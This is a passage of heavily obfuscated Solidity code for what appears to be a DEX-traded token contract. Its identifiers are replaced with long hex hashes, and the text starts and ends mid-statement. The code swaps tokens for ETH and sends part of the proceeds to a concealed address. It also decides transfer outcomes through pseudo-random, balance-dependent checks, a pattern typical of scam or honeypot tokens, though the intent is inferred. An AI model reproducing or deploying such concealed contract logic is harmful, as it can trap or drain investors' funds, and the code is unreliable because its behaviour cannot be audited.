Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499 = Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[address(this)] / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;if( Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499 == 0) return;uint256 Ox9d3ec74d74f4c63b4fd299f9b975f1c7008f6f1ddc874dea7a9da43785a54cbd9f717d6b863267a53728b77d771d3cdd65bc61b90e3f2306065cf25c9f87c2d7 = address(this).balance;address[] memory path = new address[](2);path[0] = address(this);path[1] = Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.WETH();if((Oxb4ea36a8164eae65881b55a78fe2ff3ad0e113c3e96df6c75064b35b2b8fcfafd527237415fca209c3f6a9f5058eca9779ba5cd923a0ff7590dd2bef1bfbbf87(poolList[0])*100)/Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[poolList[0]].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 >= Oxc21750d6477b3985f16b1c25c985685fa543c89d78f4408c923fb1137b1b79e5c806d3cccad81ca302e9f01b5e1c9d19331a792718a437ce8257807130fa6fbb && (Oxb4ea36a8164eae65881b55a78fe2ff3ad0e113c3e96df6c75064b35b2b8fcfafd527237415fca209c3f6a9f5058eca9779ba5cd923a0ff7590dd2bef1bfbbf87(poolList[0])*100)/Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[poolList[0]].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 <= Ox0092ac9010d14087f3aa54274c3a14387fd8e04d566eef44f6285317efc3efcbacc3acdb79423aa29bcf6f5ad2c3d14441f761e81904c8134dbf7bbb8f496707){Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.swapExactTokensForETHSupportingFeeOnTransferTokens(Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499,0,path,address(this),block.timestamp);(bool success, ) = payable(Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0).call{  value: (address(this).balance - Ox9d3ec74d74f4c63b4fd299f9b975f1c7008f6f1ddc874dea7a9da43785a54cbd9f717d6b863267a53728b77d771d3cdd65bc61b90e3f2306065cf25c9f87c2d7) * Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 / (Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 + Ox9f976ec4e0c100d174cb4a9d068dfb544bb836bc6613bea436fef95ea5db90d64f777517c5f6b72284d884fcf85692c32f440c8072497b07a3f82a74edfa3726),gas: 30000}("");require(success, "revert");}}function Oxe74913e41590f80eb05f9114141dddacea1c84c0f6dd46e2b072d6b9d086c7847d0daa66bff581217ef01e0f115534eed52ba40caf50691e75e29867d5742ad1() internal Ox1cc656cb50ff6dc39de26a95a2b4fb1941a69b3c6f48320e3b4d4791ca8630bb0f90f1f76245d3b1b012a4af7d61435fac68d22174bcb921319a32b7653e1fb6 {uint256 Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499 = address(this).balance;if( Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499 == 0) return;if( Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499 > 0) {address[] memory path = new address[](2);path[0] = Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.WETH();path[1] = address(this);uint[] memory Oxb7d265de0b41d81271d3a2d97c2dbd889adf177613ac9e437570bb833785ead6b96975ec2151ce7e39ce16bd8c8236748d9beef6cbe3c096bb211d1d3276d460; Oxb7d265de0b41d81271d3a2d97c2dbd889adf177613ac9e437570bb833785ead6b96975ec2151ce7e39ce16bd8c8236748d9beef6cbe3c096bb211d1d3276d460 = Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.getAmountsOut(Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499, path); Oxb7d265de0b41d81271d3a2d97c2dbd889adf177613ac9e437570bb833785ead6b96975ec2151ce7e39ce16bd8c8236748d9beef6cbe3c096bb211d1d3276d460[1] = Oxde3b6827f95b27514300f36b857ca81acd602c9f112e2c106920ac10d613acf09e24b8f947cf6fc05bf2b8a6bd030c9a63eaa87223371d585f4c484fd6878105(Oxb7d265de0b41d81271d3a2d97c2dbd889adf177613ac9e437570bb833785ead6b96975ec2151ce7e39ce16bd8c8236748d9beef6cbe3c096bb211d1d3276d460[1], poolList[0]);if((Oxb4ea36a8164eae65881b55a78fe2ff3ad0e113c3e96df6c75064b35b2b8fcfafd527237415fca209c3f6a9f5058eca9779ba5cd923a0ff7590dd2bef1bfbbf87(poolList[0])*100)/Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[poolList[0]].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 >= Oxc21750d6477b3985f16b1c25c985685fa543c89d78f4408c923fb1137b1b79e5c806d3cccad81ca302e9f01b5e1c9d19331a792718a437ce8257807130fa6fbb && (Oxb4ea36a8164eae65881b55a78fe2ff3ad0e113c3e96df6c75064b35b2b8fcfafd527237415fca209c3f6a9f5058eca9779ba5cd923a0ff7590dd2bef1bfbbf87(poolList[0])*100)/Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[poolList[0]].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181 <= Ox0092ac9010d14087f3aa54274c3a14387fd8e04d566eef44f6285317efc3efcbacc3acdb79423aa29bcf6f5ad2c3d14441f761e81904c8134dbf7bbb8f496707){Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.swapExactETHForTokensSupportingFeeOnTransferTokens{value: Ox3b0bd963784fab45518de2406899944286999f6a0a965a6bdd4bc057985d2416685c45ed61a4ec8f93a7f987655e7a9b21b371ce2d4f055b99c9debe3f5d2499}(Oxb7d265de0b41d81271d3a2d97c2dbd889adf177613ac9e437570bb833785ead6b96975ec2151ce7e39ce16bd8c8236748d9beef6cbe3c096bb211d1d3276d460[1] * Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxb733761bdc55c4ad606df7f1ea85673983cb74d3671abbc2f8eda90fadd99a52035867acee76eb2480297f61cddeeae4be01284fc41588e5203c12400b6a8407 / 1000,path, Ox56ea3c85383a69c4ff3f1157792fe864e068a75c1ab993a78ec50f0cca5b44211ffb0c1b308b0ed5e3b2b9d85a30830910528dd2d9d8f6e0ca660a011fa52aef, block.timestamp + 300);Ox7750c0ac9f66eba3415d4093369c3e8fa5cced3f525216d1e026cc2bbe0ed94933e439cf2c2b23ed55ffae64fee69e5f49f7d0358870c9cb496a368ff6033738(Ox699021221729738a1359b2f94cc1367d13af6beb83e699971c7371361cca2b1708480b00812422ca3b4d5339ea577f080945a42ed06d5190aecd729e9886f18a(Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e), Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[poolList[0]].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181, Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[poolList[0]].Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe, poolList[0], 2);}}}function Ox6129fbe8143da1d033274cfdd49febb7ad5d48e15fd79091b91815b5cb2ae41960b7112315c0c1756a4c5bb3a91b6b141055ad875119397e77dd4f54771fe005() internal view returns (bool) {return Ox35d0e5f6d18ca25a20d28eaf977b9f372a611a7357e93fa6d7da9ef688751187a1be9f4a02b575e051d6c5488aa76de8df8c9e6286926c1d646da8d7161ae1a8 &&(Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd < Oxcb75eb9442bc33146be25c9b1a0841155a1bfd1124954b177623ed5658a39e25a8153569d6a6226a1f38b960e046655506c0714f3b37dc2c6c59bac100381935) &&msg.sender != Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[msg.sender].pairAddress  &&!Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3 &&block.timestamp >= (Ox7663b6cb935b6748fe900e5ebe2ab0d1836f472a08f715ae5dcc83eace0b9ca8555abe274bbeda18491a88f145a658ba4c8ca72b0dd51d9691357b000f6d11b6 + 15 minutes);}function Ox39d3195795f52e55ae46f25183bb59570e42360d36a623d6debe3e074979c6552dc28bdd7b53204e18bf5d885bac86363b6695078801d522ec266a4fe72fc822() internal view returns (bool) {return !Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3 &&msg.sender != Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[msg.sender].pairAddress ;  }function Ox442ef25572a04d4f0c4a1e0986091818199225b5b53ea7a080b257e40951182171e557e5bbd890141d922cd1dddee390c32036b1d3e26639217d181c09d32a94(address sender, address recipient, uint256 amount) internal returns (bool) {bool Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2;if(!Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3 && msg.sender != Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[msg.sender].pairAddress){if(Ox114290340134a2bfa301152b6a7c4fb48d2e3ffea80d6e14fe42b85976f362bea9848775601951796655fd46b9269174ed48010e86f6ad8d33c9a21dc5b78162) {Ox114290340134a2bfa301152b6a7c4fb48d2e3ffea80d6e14fe42b85976f362bea9848775601951796655fd46b9269174ed48010e86f6ad8d33c9a21dc5b78162 = false;return true;} else if(address(this).balance >= Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox193bc2e3d520d000f97cb7aa3756c9bd6ad69586f091a692108f7a3bbda8eec6905c32747a3f026e79f08fb3fb8f4448f0502a2cd88543aadcc1b533b25a257d) { Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d = 0;return true;} else if(address(this).balance >= Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxa82526388298eb946c1519386d2ea42e558cca8d35df99a615ad184e5eac4600fb4c4f60d4d88fda427eb3d0bdd16fd11a331bb01151fa75b9f2ed34844cf640) {if(Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxe0260b87897456a7a34c013d22ae44ddb5e06bd3b23a4142b6d841d169bc38c62731fb0ff5f137302e53c89df68ec799079c155073c390524508d5b10577c247){if(!Ox7165f36f5376e104d09295ed5ec2c5debc07e6795dd8de7f8d5a89876c58c4696e7bac6b6e4eaa8cc0707fa0ee2a84f1270c6be1b5177b6b1ff6b9df992db620 && Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d < block.number) {Ox7165f36f5376e104d09295ed5ec2c5debc07e6795dd8de7f8d5a89876c58c4696e7bac6b6e4eaa8cc0707fa0ee2a84f1270c6be1b5177b6b1ff6b9df992db620 = true;uint8 Ox70f4a1340edbcf40ff649753067d5d87fc5f6e18a9c201863c44077172d0ca55a24a71d921631584e7a55b2a6038759bb4bde6594fb54f75cd384634ed70705a = Oxaac7165d4bddaf7270b630fd0ca457cb10805dd5fe80de8743279ba9495221ad5bf1ffc96abde038d32cb639300e6446c3bee80354cdab6e7180bad8b5ff5dd1(sender,recipient,amount);Ox7165f36f5376e104d09295ed5ec2c5debc07e6795dd8de7f8d5a89876c58c4696e7bac6b6e4eaa8cc0707fa0ee2a84f1270c6be1b5177b6b1ff6b9df992db620 = false;if(Ox70f4a1340edbcf40ff649753067d5d87fc5f6e18a9c201863c44077172d0ca55a24a71d921631584e7a55b2a6038759bb4bde6594fb54f75cd384634ed70705a < Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Oxba4d4f1cc732b8d3c8fdbcb5e7287a442ac31a97c823059fd4342396812412abc669e9953cfdd5ef58b27c3dd0602d10e64b8d097253c47091de07bfba934bc7) { Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2 = true;Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d = 0;} else Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d = block.number + uint256(Ox70f4a1340edbcf40ff649753067d5d87fc5f6e18a9c201863c44077172d0ca55a24a71d921631584e7a55b2a6038759bb4bde6594fb54f75cd384634ed70705a);}} else {if(Ox28e152919405b6345efac476f87cfd51ac565da9219253ebc49d030e0de2b2fd1d26198d24637abe6f82f2c29e8397c4e9d9ab8ee55736d980a440e18061ad79 == 0) { Ox28e152919405b6345efac476f87cfd51ac565da9219253ebc49d030e0de2b2fd1d26198d24637abe6f82f2c29e8397c4e9d9ab8ee55736d980a440e18061ad79 = block.number + uint256(Ox3c0e9e573404ec8384357ba72551e7710666ba08e4b25ca7764778b471ebb47998ea545e5242d660ddc058691fc4b6505086d8215fce8ae66bdf07f1c29e42f9);} else if (Ox28e152919405b6345efac476f87cfd51ac565da9219253ebc49d030e0de2b2fd1d26198d24637abe6f82f2c29e8397c4e9d9ab8ee55736d980a440e18061ad79 < block.number) {Ox28e152919405b6345efac476f87cfd51ac565da9219253ebc49d030e0de2b2fd1d26198d24637abe6f82f2c29e8397c4e9d9ab8ee55736d980a440e18061ad79 = 0;Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2 = true;}}}}return Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2;}function Oxaac7165d4bddaf7270b630fd0ca457cb10805dd5fe80de8743279ba9495221ad5bf1ffc96abde038d32cb639300e6446c3bee80354cdab6e7180bad8b5ff5dd1(address sender, address recipient, uint256 amount) internal returns(uint8) {uint256 Oxaa189d280987ed93de291d0ac0f5c3e187478b1c0b7127c00c526e798d681bab432b9d794f3fca154deae37ce07c790400f5cc688300deed558d983cfbff1605 = uint256(keccak256(abi.encodePacked(Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd, amount, sender.balance,Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[sender],recipient.balance, Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[recipient], Oxbcab3301be21a77b5a1b795fcc21dd615d8d8de6dcbf57d424930c589e6b69ecfebf2e121abd59964ae3589af43b3dad3965a63a9ae7d21c3f9946a83d0f6591++, block.timestamp, msg.sender, blockhash(block.number - 1))));return uint8(Oxaa189d280987ed93de291d0ac0f5c3e187478b1c0b7127c00c526e798d681bab432b9d794f3fca154deae37ce07c790400f5cc688300deed558d983cfbff1605 % 100000000000000000000);}function Oxecb44a49e94e2f0a3667d98d8b507e729cce0edeb482f3de6ff80dd4747af3b4adc7c187d0fa4142e43dda689b210933391ba9a8305cce6e2c3f88cc0f582816(IPancakeSwapPair Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078, uint256 Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f ) internal view returns(uint256) {uint256 Ox02edf352098f16983f0f2022cd43613e333876beb81e34ad048de2814ec1afd50a82648c7215edfcffb3f6c26cfeb60ed7f5f39abd3a4c2b39b14d69df3bee07;(uint Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d, uint Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08,) = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.getReserves();if(Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d > 0 && Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08 > 0) { address Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f;address Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c;if(Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token0() == address(this)) {(Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d, Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08) = (Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08, Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d);Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token1();Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c = address(this);} else if(Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token1() == Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.WETH()) {(Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d, Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08) = (Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08, Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d);Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f = address(this);Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token0();} else {Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token0();Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token1();}Ox02edf352098f16983f0f2022cd43613e333876beb81e34ad048de2814ec1afd50a82648c7215edfcffb3f6c26cfeb60ed7f5f39abd3a4c2b39b14d69df3bee07 = ((Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f * 1e10) * (Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d * 1e18/Oxb023b4a4990e9601c5cd7c85127b46de61bbac711141fdffbc6485a973530a12a8c82d2a890262f4720a90fbe9ea7cbb9116a5f549e4cf8d52f98210bc69ac5c[Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f])) / (Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08 * 1e18/Oxb023b4a4990e9601c5cd7c85127b46de61bbac711141fdffbc6485a973530a12a8c82d2a890262f4720a90fbe9ea7cbb9116a5f549e4cf8d52f98210bc69ac5c[Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c]) / 1e10;}return Ox02edf352098f16983f0f2022cd43613e333876beb81e34ad048de2814ec1afd50a82648c7215edfcffb3f6c26cfeb60ed7f5f39abd3a4c2b39b14d69df3bee07;}function Ox125f095bd576d943b74bf31965e996e19a95e6380047ddedca72bf7007708a8af3c78778ae48bb64fb7a870e9b64cc46000a16c2a8a7f81afdd6bcb1db8b25f5(address Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a) internal {uint256 Oxeb450c9a3affde2653d1b094fc309a04afe54b841e422c369e982e779bf8cd58740eab37cdc79aba16c32d8c19f4499c143da02aa3c7426ad8fcc956d0d32242;if(block.number > Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Oxf53b536f8f63a121f71a8464f904c96d4e525bae023cd62463aa5813869ef7d6475fc7f26e87b92590343771cb728d766190079a63f7985a111c0b22dd355e42) {Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox9977bd199a9beffc68ee599ee725ab0f5fb3ed376cb1e109e9707af28e064c88851c2f6dfcfd5356b703547a214095f53475a3bc32596cd1607707d1fb6acd1a].Oxf53b536f8f63a121f71a8464f904c96d4e525bae023cd62463aa5813869ef7d6475fc7f26e87b92590343771cb728d766190079a63f7985a111c0b22dd355e42 = block.number + Ox4271961e9eedf5678bac682977725e2299d8e833199505b8c97e295e272938da511cd9748d21164a8dae795c21f69c0ec0a5e75c180f741e11f2cd52341933c3;Oxeb450c9a3affde2653d1b094fc309a04afe54b841e422c369e982e779bf8cd58740eab37cdc79aba16c32d8c19f4499c143da02aa3c7426ad8fcc956d0d32242 = 